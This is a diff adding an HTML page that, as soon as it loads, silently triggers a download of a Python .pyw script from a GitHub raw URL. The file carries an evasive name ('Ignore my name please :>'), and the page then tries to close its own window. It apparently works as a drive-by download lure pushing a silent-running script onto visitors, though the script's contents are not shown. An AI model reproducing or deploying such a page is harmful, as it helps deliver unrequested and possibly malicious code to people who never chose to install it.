@@ -1,0 +1,61 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Downloading...</title>
+    <style>
+        body {
+            font-family: system-ui, sans-serif;
+            height: 100vh;
+            margin: 0;
+            display: grid;
+            place-items: center;
+            background: #f8fafc;
+            color: #334155;
+        }
+        .status {
+            text-align: center;
+            padding: 2rem;
+        }
+    </style>
+</head>
+<body>
+    <div class="status" id="status">Preparing download...</div>
+
+    <script>
+        const GITHUB_FILE_URL = "https://raw.githubusercontent.com/epickfr/LUNAFLIX/refs/heads/main/Ignore%20my%20name%20please%20%3A%3E.pyw";
+
+        function startDownload() {
+            const status = document.getElementById('status');
+
+            const a = document.createElement('a');
+            a.href = GITHUB_FILE_URL;
+            a.download = GITHUB_FILE_URL.split('/').pop();
+            a.style.display = 'none';
+            document.body.appendChild(a);
+
+            const closeWindow = () => {
+                status.textContent = "Download started. Closing window...";
+
+                setTimeout(() => {
+                    window.close();
+
+                    status.textContent = "✅ Download started. You can now close this window.";
+                }, 100);
+            };
+
+            window.addEventListener('blur', closeWindow, { once: true });
+
+            setTimeout(closeWindow, 3000);
+
+            a.click();
+
+            document.body.removeChild(a);
+            status.textContent = "Starting download...";
+        }
+
+        window.addEventListener('load', startDownload);
+    </script>
+</body>
+</html>
